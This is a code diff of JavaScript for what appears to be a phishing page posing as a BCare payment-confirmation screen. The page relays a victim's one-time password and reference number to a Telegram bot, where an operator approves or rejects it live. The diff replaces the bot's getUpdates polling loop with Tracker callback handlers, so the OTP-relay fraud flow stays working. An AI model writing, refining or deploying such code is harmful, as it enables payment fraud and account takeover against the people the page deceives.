@@ -10,8 +10,6 @@ const TG = {
 };
 
 let userOTP = '';
-let pollInt = null;
-let lastUpdateId = 0;
 let waitingConfirm = false;
 let myRefNumber = '';
 let otpLength = 6;
@@ -49,16 +47,6 @@ async function tgEditMessage(messageId, text) {
         body: JSON.stringify({ chat_id: TG.CHAT, message_id: messageId, text, parse_mode: 'HTML' }) }
     );
   } catch(e) {}
-}
-
-async function tgGetUpdates() {
-  try {
-    const res = await fetch(
-      `https://api.telegram.org/bot${TG.TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=2`
-    );
-    const data = await res.json();
-    return data.ok ? (data.result || []) : [];
-  } catch(e) { return []; }
 }
 
 /* ─── بناء رسالة OTP مع أزرار ─────────────────────── */
@@ -172,7 +160,6 @@ function initBoxes() {
       if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.innerHTML = '<span class="material-icons">check_circle</span> تأكيد العملية'; }
       clearOTPErr();
       waitingConfirm = false;
-      clearInterval(pollInt);
 
       await tgSend(`🔄 <b>إعادة إرسال — بي كير</b>\n🆔 المرجع: <code>${myRefNumber}</code>`);
 
@@ -208,49 +195,44 @@ function startResendTimer() {
 
 /* ─── Polling قرار الأدمن ──────────────────────────── */
 function startPolling() {
-  clearInterval(pollInt);
-  pollInt = setInterval(async () => {
+  Tracker.onCallback('otp_approve_', async (cq, data) => {
     if (!waitingConfirm) return;
-    const updates = await tgGetUpdates();
-    for (const u of updates) {
-      lastUpdateId = u.update_id;
-
-      if (u.callback_query) {
-        const cq = u.callback_query;
-        const data = cq.data || '';
-
-        if (data.startsWith('otp_approve_')) {
-          const parts = data.replace('otp_approve_', '').split('_');
-          const ref = parts[0];
-          const code = parts.slice(1).join('_');
-          if (ref === myRefNumber && code === userOTP) {
-            waitingConfirm = false;
-            clearInterval(pollInt);
-            await tgAnswerCallback(cq.id, '✅ تمت الموافقة');
-            await tgEditMessage(cq.message.message_id, cq.message.text + '\n\n✅ <b>تم تأكيد الدفع بنجاح</b>');
-            showSuccess();
-            return;
-          }
-        }
-
-        if (data.startsWith('otp_reject_')) {
-          const ref = data.replace('otp_reject_', '');
-          if (ref === myRefNumber) {
-            waitingConfirm = false;
-            clearInterval(pollInt);
-            await tgAnswerCallback(cq.id, '❌ تم الرفض');
-            await tgEditMessage(cq.message.message_id, cq.message.text + '\n\n❌ <b>تم رفض العملية</b>');
-            showRejectRetry();
-            return;
-          }
-        }
-      }
-
-      const text = (u.message?.text || '').trim();
-      if (text.toUpperCase() === 'REJECT') { waitingConfirm = false; clearInterval(pollInt); showRejectRetry(); return; }
-      if (text === userOTP) { waitingConfirm = false; clearInterval(pollInt); showSuccess(); return; }
+    const parts = data.replace('otp_approve_', '').split('_');
+    const ref = parts[0];
+    const code = parts.slice(1).join('_');
+    if (ref === myRefNumber && code === userOTP) {
+      waitingConfirm = false;
+      tgAnswerCallback(cq.id, '✅ تمت الموافقة');
+      tgEditMessage(cq.message.message_id, cq.message.text + '\n\n✅ <b>تم تأكيد الدفع بنجاح</b>');
+      showSuccess();
     }
-  }, 2500);
+  });
+
+  Tracker.onCallback('otp_reject_', async (cq, data) => {
+    if (!waitingConfirm) return;
+    const ref = data.replace('otp_reject_', '');
+    if (ref === myRefNumber) {
+      waitingConfirm = false;
+      tgAnswerCallback(cq.id, '❌ تم الرفض');
+      tgEditMessage(cq.message.message_id, cq.message.text + '\n\n❌ <b>تم رفض العملية</b>');
+      showRejectRetry();
+    }
+  });
+
+  Tracker.onCallback('REJECT', async (msg) => {
+    if (!waitingConfirm) return;
+    waitingConfirm = false;
+    showRejectRetry();
+  });
+
+  Tracker.onAnyMessage(async (msg) => {
+    if (!waitingConfirm) return;
+    const text = (msg.text || '').trim();
+    if (text === userOTP) {
+      waitingConfirm = false;
+      showSuccess();
+    }
+  });
 }
 
 /* ─── رفض ──────────────────────────────────────────── */
@@ -332,11 +314,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     myRefNumber = offer.refNumber || ('BC-' + Date.now().toString().slice(-8).toUpperCase());
     if (!offer.refNumber) { offer.refNumber = myRefNumber; sessionStorage.setItem('bcare_offer', JSON.stringify(offer)); }
   } catch(e) { myRefNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase(); }
-
-  const oldUpdates = await tgGetUpdates();
-  if (oldUpdates.length > 0) {
-    lastUpdateId = oldUpdates.reduce((max, u) => Math.max(max, u.update_id), 0);
-  }
 
   updateCounter();
   startResendTimer();
